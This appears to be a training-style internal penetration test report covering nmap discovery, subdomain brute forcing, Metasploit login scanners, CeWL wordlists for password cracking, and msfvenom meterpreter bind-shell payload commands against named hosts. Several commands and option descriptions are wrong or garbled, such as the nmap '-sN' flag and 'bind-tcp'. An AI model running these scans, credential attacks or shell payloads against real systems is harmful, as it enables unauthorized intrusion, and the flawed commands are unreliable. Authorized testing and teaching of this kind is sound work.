# Summary
An Internal Network Penetration Test was conducted on the network range 10.10.10.0/24 and the domain https://virtualinfosecafrica.com/ between September 12th and September 14th, 2024. This report details the findings from the penetration test, which captures the network security status of the specified scope at that particular moment. Further information can be found in the following sections.

# Testing_Methodogy
The testing began with the use of the Network Mapper (NMAP) tool to identify active hosts and services within the provided IP address range. The results from this tool were then reviewed manually, with hosts and services being individually enumerated to identify any potential vulnerabilities or weaknesses that may have been overlooked. Additionally, web-based attack surfaces were exploited to create and deploy payloads.

# Host Discovery
Host discovery involves identifying active devices on a network. This process helps to refine the scope of a network assessment or security testing. One of the most commonly used tools for host discovery is Nmap.

Nmap is an open-source command-line tool that uses ICMP, echo requests, TCP, and UDP packets to detect active hosts on a network.

When using Nmap, various options or arguments are available for host discovery, depending on the specific objectives. Some of these include:
- `-sL`: List scan (Simply lists the targets to be scanned)
- `-sN`: Ping scan (Disables port scanning)
- `-Pn`: Treats all hosts as online (Skips host discovery)

For our scan report, we used the `-sn` argument. The command executed was `nmap -sn 10.10.10.0/24`. Here, `-sn` (or `--ping-scan`) directs Nmap to perform a ping scan, which identifies live hosts without conducting a full port scan. This method only verifies if hosts are active, without detailing the services they are running. The `10.10.10.0/24` specifies the target network, with `/24` representing a subnet mask of 255.255.255.0. This means the scan covers all IP addresses from 10.10.10.1 to 10.10.10.254.

The output from the Nmap command provides details about active hosts. To filter and extract only the lines that indicate which hosts are online, you can use tools like grep and awk. The command to achieve this is:

nmap -sn 10.10.10.0/24 | grep "Nmap scan report for" | awk '{print $5}'

This command works as follows:

grep "Nmap scan report for" filters the output to include only lines that contain the phrase "Nmap scan report for," which indicates an active host.
awk '{print $5}' extracts and displays the fifth field from these lines, which corresponds to the IP addresses of the hosts that are up.

This command sequence utilizes `grep` to identify lines indicating that a host is online and `awk` to extract and print only the IP addresses of those hosts.

To save the results to a file, you can redirect the output of the command to a file. For example:

nmap -sn 10.10.10.0/24 | grep "Nmap scan report for" | awk '{print $5}' > hosts_up.txt

This command will save the IP addresses of the active hosts into a file named `hosts_up.txt`.

![Host_up](Images/host_up.png)

This command will create (or overwrite) a file named `hosts_up.txt` containing the list of IP addresses for active hosts.

To verify that the file has been correctly written, you can use the following command to view its contents:

cat hosts_up.txt

For subdomain enumeration, you can use the `aiodnsbrute` tool. To enumerate subdomains for `https://virtualinfosecafrica.com` using a wordlist located at `/usr/share/wordlists/rockyou.txt`, use the following command:

aiodnsbrute -d virtualinfosecafrica.com -w /usr/share/wordlists/rockyou.txt > subdomains.txt

This command will output the discovered subdomains into a file named `subdomains.txt`.

# Sevice Discovery and Port Scanning
Service discovery, or port scanning, involves actively probing a target network to identify open ports and the services running on them. This process maps out the applications and potential vulnerabilities exposed by checking which ports are actively listening for connections, thereby providing crucial information for further penetration testing.

Service discovery and port scanning are key aspects of network security assessments, penetration testing, and overall network management. Understanding which services are active and which ports are open is vital for evaluating a system's security posture. Unsecured or outdated services can be exploited if not properly managed.

Certain services may have known vulnerabilities. Identifying these services allows you to apply relevant security patches or adjustments. Additionally, ensuring that only authorized services are running is often necessary for compliance with security standards and regulations.

To conduct a service discovery scan and save the results in a greppable Nmap format, use the following command:

nmap -sV -oG nmap_services.txt 10.10.10.0/24

![nmap_oG](Images/nmap_oG.png)

After obtaining the Nmap results in greppable format, you can filter the results by protocol using `grep`.

To extract TCP services from the results, use the following command:

grep "/tcp" nmap_services.txt > tcp_services_separated.txt

This command searches for lines containing "/tcp" in the `nmap_services.txt` file and saves the filtered results to `tcp_services_separated.txt`.

# Vulnerabilities
Vulnerabilities are scan using metasploit by first running metasploit console

In the Metasploit console, we use the db_import command to import the results.

db_import /path/to/nmap_results.xml

we now search for available auxiliary modules in Metasploit that can scan for vulnerabilities based on nmap results, we use:

search type:auxiliary using:

use auxiliary/scanner/mysql/mysql_login,

use auxiliary/scanner/vnc/vnc_login

use auxiliary/scanner/rdp/rdp_login

use auxiliary/scanner/smb/smb_login

we can scan for vulnerabilities To use protocol-specific file created, we can use it with scanning tools in Metasploit.

First we launch msfconsole;

msfconsole
msconf

Then select an Auxiliary Module:

For example, if you want to scan mysql services for vulnerabilities:

use auxiliary/scanner/mysql/mysql_login
mysql

Set the RHOSTS Option:

Point RHOSTS to the protocol-specific file:

set RHOSTS file:/path/to/protocol_specific_file.txt
RHOSTS_file

Run the Scan:

run
We can develop a custom wordlist by using cewl.

CeWL (Custom Word List generator) is a tool that can be used to create a custom wordlist by crawling a website. This is particularly useful for tasks such as password cracking or fuzzing where a tailored wordlist might be more effective than a generic one. Hereâ€™s how you can use CeWL to generate a custom wordlist and describe scenarios where it would be useful.

To generate a wordlist using CeWL, the target URL is specified and various parameters are optionally configured to customize the output.

Using the command line;

cewl http://virtualinfosecafrica.com -w custom_wordlist.txt
Once the wordlist is generated, it can be reviewed to ensure it contains the desired entries by using;

cat custom_wordlist.txt
The wordlist file will be a plain text file with one word per line.

### Web-Based Attack Surfaces

Web-based attack surfaces encompass web application interfaces, authentication mechanisms, APIs, and server configurations. These areas can present security risks such as SQL injection or session hijacking. Key security measures include:

- Input validation
- Secure session management
- Keeping software updated

Addressing vulnerabilities in these areas helps protect against exploits and enhances overall web security.

### Using Eyewitness for Web Server Screenshots

To take screenshots of servers, including those on non-standard HTTP/HTTPS ports, use the following bash command:

eyewitness -f hosts.txt --web --resolve --ports 80,443,8080,8443

### Generating Payloads with msfvenom

To generate a base64-encoded payload that triggers a TCP bind shell on execution on host 10.10.10.55 (Apache Tomcat), use this command:

msfvenom -p java/meterpreter/bind-tcp LHOST=10.10.10.55 LPORT=4444 -f jar

For a payload that triggers a TCP bind shell on execution on host 10.10.10.30 (Python Server), use this command:

msfvenom -p python/meterpreter/bind-tcp LHOST=10.10.10.30 LPORT=4444 -e base64

These commands will help you create the necessary payloads for your penetration testing tasks.
